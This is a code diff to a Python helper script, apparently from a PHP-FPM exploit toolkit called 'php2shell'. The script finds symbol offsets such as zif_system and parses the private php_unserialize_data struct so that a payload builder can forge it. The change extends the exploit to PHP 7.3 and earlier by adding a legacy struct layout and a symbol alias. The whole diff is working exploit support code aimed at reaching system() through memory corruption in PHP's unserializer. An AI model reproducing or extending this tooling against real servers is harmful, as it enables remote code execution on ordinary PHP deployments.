@@ -24,7 +24,6 @@ import copy
 import json
 import os
 import re
-import shutil
 import subprocess
 import sys
 import tempfile
@@ -33,6 +32,8 @@ ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 HERE = os.path.dirname(os.path.abspath(__file__))
 RUNTIME = os.path.join(ROOT, "lab", "fpm", "runtime")
 SYMBOLS = ("zif_system", "zval_ptr_dtor", "basic_globals")
+# PHP <= 7.2 exported the zval destructor under the underscore name
+SYMBOL_ALIASES = {"zval_ptr_dtor": ("zval_ptr_dtor", "_zval_ptr_dtor")}
 OFFSETS_C = os.path.join(HERE, "php2shell_fpm_offsets.c")
 
 # branch -> first release that carries the fix.  PHP 8.1 and older (7.x
@@ -70,17 +71,26 @@ DEFAULT_LAYOUT = {
 
 
 def parse_nm(text: str) -> dict[str, int]:
-    """Return the offsets of the required symbols from ``nm -n`` output."""
+    """Return the offsets of the required symbols from ``nm -n`` output.
+
+    Older releases export some symbols under a different name (PHP <= 7.2
+    prefixes the zval destructor with an underscore), so every alias of a
+    symbol resolves to its canonical key.
+    """
+    aliases = {alias: canonical
+               for canonical, names in SYMBOL_ALIASES.items()
+               for alias in names}
     found: dict[str, int] = {}
     for line in text.splitlines():
         parts = line.split()
         if len(parts) < 3:
             continue
         address, name = parts[0], parts[2]
-        if name not in SYMBOLS or name in found:
+        canonical = name if name in SYMBOLS else aliases.get(name)
+        if canonical is None or canonical in found:
             continue
         try:
-            found[name] = int(address, 16)
+            found[canonical] = int(address, 16)
         except ValueError:
             continue
     missing = [name for name in SYMBOLS if name not in found]
@@ -135,8 +145,15 @@ def parse_unserialize_struct(source_dir: str) -> dict:
     """Parse ``struct php_unserialize_data`` from the PHP source tree.
 
     The struct is private to ext/standard/var_unserializer.c, so the offsets
-    are derived from the source: every member is a pointer or a zend_long
-    (8 bytes), and ``var_entries`` embeds ``zval *data[VAR_ENTRIES_MAX]``.
+    are derived from the source.  Two shapes exist:
+
+    * PHP >= 7.4 embeds a ``var_entries entries`` block, so the struct is
+      8216 bytes and ``last`` points at its own embedded block.
+    * PHP <= 7.3 keeps only five pointers (``first``, ``last``,
+      ``first_dtor``, ``last_dtor``, ``allowed_classes``) and allocates one
+      ``var_entries`` block per 1024 pushed zvals, linked through
+      ``first``/``last``.  The ``legacy`` flag tells the payload builder
+      which shape to forge.
     """
     candidates = []
     for relative in ("ext/standard/var_unserializer.c",
@@ -160,7 +177,9 @@ def parse_unserialize_struct(source_dir: str) -> dict:
         raise RuntimeError("php_unserialize_data definition not found")
     body = match.group(1)
 
-    offsets: dict[str, int] = {}
+    # every member is a pointer or a zend_long: 8 bytes on the 64-bit builds
+    # this repository supports
+    members: list[str] = []
     for line in body.splitlines():
         line = line.split("/*")[0].strip()
         if not line or line.startswith("//") or not line.endswith(";"):
@@ -168,24 +187,36 @@ def parse_unserialize_struct(source_dir: str) -> dict:
         declaration = line[:-1].strip()
         if not declaration:
             continue
-        name = declaration.split()[-1].lstrip("*")
-        if name in _UNSERIALIZE_FIELDS:
-            offsets[name] = 8 * len(offsets)
+        name = declaration.split()[-1].lstrip("*").split("[")[0]
+        members.append(name)
 
-    if "entries" not in offsets:
-        raise RuntimeError("php_unserialize_data has no entries member")
+    if not members:
+        raise RuntimeError("php_unserialize_data has no members")
+    offsets = {name: 8 * index for index, name in enumerate(members)}
 
     max_match = re.search(r"#define\s+VAR_ENTRIES_MAX\s+(\d+)", text)
     if not max_match:
         raise RuntimeError("VAR_ENTRIES_MAX not found")
     entries_max = int(max_match.group(1))
-    # var_entries: zend_long used_slots; void *next; zval *data[MAX]
-    var_entries = {"used_slots": 0, "next": 8, "data": 16, "max": entries_max}
-    size = offsets["entries"] + 16 + 8 * entries_max
+
+    if "entries" in offsets:
+        # embedded block: var_entries {used_slots, next, zval *data[MAX]}
+        var_entries = {"used_slots": 0, "next": 8, "data": 16,
+                       "max": entries_max}
+        size = offsets["entries"] + 16 + 8 * entries_max
+        legacy = False
+    else:
+        # separate blocks: var_entries {zval *data[MAX], used_slots, next}
+        var_entries = {"data": 0, "used_slots": 8 * entries_max,
+                       "next": 8 * entries_max + 8, "max": entries_max}
+        size = 8 * len(members)
+        legacy = True
+
     return {
         "offsets": offsets,
         "var_entries": var_entries,
         "size": size,
+        "legacy": legacy,
     }
 
 
@@ -212,8 +243,12 @@ def build_layout(prefix: str, source_dir: str | None) -> dict:
         except (RuntimeError, OSError) as exc:
             print(f"[!] unserialize layout: {exc}", file=sys.stderr)
         else:
-            layout["unserialize_data"].update(parsed["offsets"])
+            # the parse covers every member of the struct, so it replaces the
+            # defaults instead of merging into them: PHP <= 7.3 has no
+            # cur_depth/max_depth and no embedded entries block at all
+            layout["unserialize_data"] = dict(parsed["offsets"])
             layout["unserialize_data"]["size"] = parsed["size"]
+            layout["unserialize_data"]["legacy"] = parsed["legacy"]
             layout["var_entries"] = parsed["var_entries"]
     return layout
 
